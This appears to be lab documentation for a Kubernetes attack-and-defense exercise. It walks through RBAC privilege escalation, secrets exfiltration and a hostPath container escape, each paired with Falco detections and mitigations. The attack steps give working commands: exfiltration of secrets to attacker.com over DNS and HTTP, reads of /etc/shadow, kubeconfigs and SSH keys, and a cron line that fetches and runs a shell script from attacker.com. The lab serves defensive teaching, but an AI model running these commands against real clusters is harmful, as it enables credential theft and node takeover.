# Kubernetes Attack Scenarios

This document provides detailed attack scenarios for the Kubernetes Attack & Defense Lab. Each attack demonstrates common security misconfigurations and exploitation techniques.

⚠️ **WARNING**: These attacks are for educational purposes only. Never run these attacks against production systems or systems you don't own.

---

## Table of Contents
1. [RBAC Privilege Escalation](#rbac-privilege-escalation)
2. [Secrets Exfiltration](#secrets-exfiltration)
3. [HostPath Container Escape](#hostpath-container-escape)
4. [Detecting Attacks with Falco](#detecting-attacks-with-falco)

---

## RBAC Privilege Escalation

### Overview
This attack demonstrates how overly-permissive RBAC (Role-Based Access Control) configurations can allow a compromised pod to escalate privileges and access cluster-wide resources.

### Threat Model
- **Attacker Goal**: Gain cluster-admin level access from a compromised pod
- **Vulnerability**: ServiceAccount with excessive permissions
- **Impact**: Full cluster compromise, data exfiltration, lateral movement

### Attack Steps

#### 1. Deploy the Vulnerable Pod
```bash
kubectl apply -f attacks/rbac-misuse/overprivileged-sa.yaml
```

#### 2. Verify Pod is Running
```bash
kubectl get pods -n attack-namespace
```
**Expected Output:**
```
NAME                    READY   STATUS    RESTARTS   AGE
attacker-pod            1/1     Running   0          10s
```

#### 3. Exec into the Attacker Pod
```bash
kubectl exec -it attacker-pod -n attack-namespace -- /bin/bash
```

#### 4. Exploit the Overprivileged ServiceAccount
From inside the pod:
```bash
# Check what permissions we have
kubectl auth can-i --list

# List all secrets in all namespaces (should succeed)
kubectl get secrets --all-namespaces

# Try to create a new admin user (should succeed)
kubectl create clusterrolebinding attacker-admin --clusterrole=cluster-admin --serviceaccount=attack-namespace:attacker-sa

# List all nodes
kubectl get nodes

# Access etcd secrets (if available)
kubectl get secrets -n kube-system
```

### Expected Results
**Successful Attack Output:**
```
NAMESPACE        NAME                           TYPE                                  DATA   AGE
default          default-token-xxxxx            kubernetes.io/service-account-token   3      10d
kube-system      bootstrap-token-xxxxx          bootstrap.kubernetes.io/token         6      10d
kube-system      certificate-controller-token   kubernetes.io/service-account-token   3      10d
```

### Detection Indicators
- **Falco Alert**: "Unexpected K8s API call with GET /api/v1/secrets"
- **Audit Log**: Excessive API server requests from a single ServiceAccount
- **Behavioral**: Pod accessing resources outside its namespace

### Mitigation
1. Follow the principle of least privilege for ServiceAccounts
2. Use Pod Security Policies/Standards to restrict ServiceAccount token mounting
3. Implement admission controllers (Kyverno/OPA) to validate RBAC configurations
4. Regular RBAC audits using `kubectl auth can-i --list`

---

## Secrets Exfiltration

### Overview
This attack shows how a compromised pod can access mounted secrets and exfiltrate them to external systems.

### Threat Model
- **Attacker Goal**: Extract sensitive credentials and API keys
- **Vulnerability**: Secrets mounted as volumes without proper access controls
- **Impact**: Credential theft, unauthorized access to external services

### Attack Steps

#### 1. Deploy the Secret Exfiltration Pod
```bash
kubectl apply -f attacks/secret-exfil/exfil-pod.yaml
```

#### 2. Check Pod Status
```bash
kubectl get pods -n attack-namespace
kubectl describe pod secret-exfil-pod -n attack-namespace
```

#### 3. Access the Pod and Locate Secrets
```bash
kubectl exec -it secret-exfil-pod -n attack-namespace -- /bin/bash
```

#### 4. Exfiltrate Secret Data
From inside the pod:
```bash
# List mounted secrets
ls -la /var/secrets/

# Read secret contents
cat /var/secrets/db-password
cat /var/secrets/api-key

# Attempt to exfiltrate via DNS (covert channel)
for byte in $(cat /var/secrets/api-key | xxd -p); do 
  nslookup $byte.attacker.com
done

# Attempt HTTP exfiltration
curl -X POST -d @/var/secrets/db-password https://attacker.com/collect

# Base64 encode and exfiltrate
cat /var/secrets/api-key | base64 | curl -X POST -d @- https://attacker.com/data
```

### Expected Results
**Successful Attack Output:**
```bash
# Secret contents visible
$ cat /var/secrets/db-password
SuperSecretPassword123!

$ cat /var/secrets/api-key
ak_live_51234567890abcdef
```

### Detection Indicators
- **Falco Alert**: "Sensitive file read by a container process"
- **Network Monitoring**: Unusual DNS queries or HTTP POST requests
- **Falco Alert**: "Outbound connection to suspicious IP"
- **File Access**: /var/run/secrets/kubernetes.io/serviceaccount accessed

### Mitigation
1. Use NetworkPolicies to restrict egress traffic
2. Implement secrets encryption at rest
3. Use external secret management (HashiCorp Vault, AWS Secrets Manager)
4. Enable audit logging for secret access
5. Use short-lived credentials with automatic rotation
6. Apply Pod Security Standards to restrict volume mounts

---

## HostPath Container Escape

### Overview
This attack demonstrates how mounting the host filesystem (`hostPath`) allows a container to escape isolation and gain access to the underlying node.

### Threat Model
- **Attacker Goal**: Escape container and compromise the Kubernetes node
- **Vulnerability**: Pod with hostPath volume mount
- **Impact**: Full node compromise, access to all pods on node, potential cluster takeover

### Attack Steps

#### 1. Deploy the HostPath Attack Pod
```bash
kubectl apply -f attacks/hostpath-escape/hostpath-pod.yaml
```

#### 2. Verify Pod Deployment
```bash
kubectl get pods -n attack-namespace
kubectl describe pod hostpath-attacker -n attack-namespace | grep -A5 Volumes
```

#### 3. Access the Pod
```bash
kubectl exec -it hostpath-attacker -n attack-namespace -- /bin/bash
```

#### 4. Explore Host Filesystem
From inside the pod:
```bash
# Navigate to mounted host root
cd /host

# Access host processes
ps aux

# Read sensitive host files
cat /host/etc/shadow
cat /host/etc/kubernetes/kubelet.conf
cat /host/root/.ssh/id_rsa

# Access other containers' filesystems
ls /host/var/lib/docker/containers/
ls /host/var/lib/kubelet/pods/

# Modify host cron for persistence
echo '* * * * * root curl http://attacker.com/shell.sh | bash' >> /host/etc/crontab

# Install backdoor on host
chroot /host /bin/bash
# Now you're effectively root on the host!
```

#### 5. Advanced Exploitation
```bash
# Create privileged container on host
chroot /host
docker run -it --privileged --pid=host --net=host --ipc=host \
  -v /:/host ubuntu bash

# Access host's Kubernetes config
cat /host/etc/kubernetes/admin.conf > /tmp/kubeconfig
export KUBECONFIG=/tmp/kubeconfig
kubectl get nodes
kubectl get secrets --all-namespaces
```

### Expected Results
**Successful Attack Output:**
```bash
# Full access to host filesystem
$ ls /host
bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var

# Access to sensitive files
$ cat /host/etc/shadow | head -n3
root:$6$xyz...:18000:0:99999:7:::
daemon:*:18000:0:99999:7:::
bin:*:18000:0:99999:7:::

# Container escape successful
$ chroot /host hostname
kubernetes-node-01
```

### Detection Indicators
- **Falco Alert**: "Container with hostPath volume detected"
- **Falco Alert**: "Sensitive file opened for reading by non-trusted program"
- **Falco Alert**: "Process launched from modified binary"
- **System**: Unusual process activity on the host
- **Audit**: Pod with hostPath mount in security-sensitive namespace

### Mitigation
1. **Prohibit hostPath mounts** using Pod Security Standards (restricted policy)
2. Use admission controllers to block hostPath:
   ```yaml
   # Kyverno Policy Example
   apiVersion: kyverno.io/v1
   kind: ClusterPolicy
   metadata:
     name: disallow-host-path
   spec:
     rules:
     - name: validate-hostPath
       match:
         resources:
           kinds:
           - Pod
       validate:
         message: "HostPath volumes are not allowed"
         pattern:
           spec:
             =(volumes):
             - X(hostPath): "null"
   ```
3. Enable Pod Security Admission with restricted enforcement
4. Use RuntimeClass for additional isolation
5. Regular security audits for privileged pods

---

## Detecting Attacks with Falco

### Setting Up Detection

#### Install Falco
```bash
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco \
  --namespace falco-system \
  --create-namespace \
  --set falco.grpc.enabled=true
```

#### Monitor Falco Alerts
```bash
# View real-time alerts
kubectl logs -f -n falco-system -l app.kubernetes.io/name=falco

# Filter for critical alerts
kubectl logs -n falco-system -l app.kubernetes.io/name=falco | grep -i "priority=critical"
```

### Expected Falco Alerts for Each Attack

**RBAC Attack:**
```json
{
  "output": "Unexpected K8s API call with GET /api/v1/secrets (user=system:serviceaccount:attack-namespace:attacker-sa)",
  "priority": "Warning",
  "rule": "Unexpected K8s API Call",
  "time": "2025-01-23T10:15:30Z"
}
```

**Secrets Exfiltration:**
```json
{
  "output": "Sensitive file opened for reading (user=root file=/var/secrets/api-key command=cat)",
  "priority": "Warning",
  "rule": "Read sensitive file untrusted",
  "time": "2025-01-23T10:20:45Z"
}
```

**HostPath Escape:**
```json
{
  "output": "Container with hostPath volume detected (pod=hostpath-attacker namespace=attack-namespace)",
  "priority": "Critical",
  "rule": "Launch Privileged Container",
  "time": "2025-01-23T10:25:15Z
}
```

---

## Attack Summary Matrix

| Attack Type | Difficulty | Impact | Detection Difficulty | Mitigation Priority |
|-------------|------------|--------|---------------------|--------------------|
| RBAC Misuse | Easy | High | Medium | High |
| Secrets Exfil | Easy | High | Medium | High |
| HostPath Escape | Medium | Critical | Easy | Critical |

---

## Best Practices for Testing

1. **Isolation**: Always run these attacks in isolated, non-production environments
2. **Documentation**: Document all findings and attack paths
3. **Cleanup**: Remove all attack pods after testing:
   ```bash
   kubectl delete namespace attack-namespace
   ```
4. **Baseline**: Establish normal behavior before running attacks
5. **Monitoring**: Ensure Falco and audit logging are enabled before testing
6. **Team Notification**: Inform security team before running attack simulations

---

## Next Steps

- Review [Defenses Documentation](defenses.md) to learn how to prevent these attacks
- Set up automated attack detection with Falco
- Implement Pod Security Standards
- Configure Network Policies
- Deploy admission controllers (Kyverno/OPA)

---

## References

- [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/)
- [RBAC Good Practices](https://kubernetes.io/docs/concepts/security/rbac-good-practices/)
- [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [Falco Documentation](https://falco.org/docs/)
- [MITRE ATT&CK for Containers](https://attack.mitre.org/matrices/enterprise/containers/)
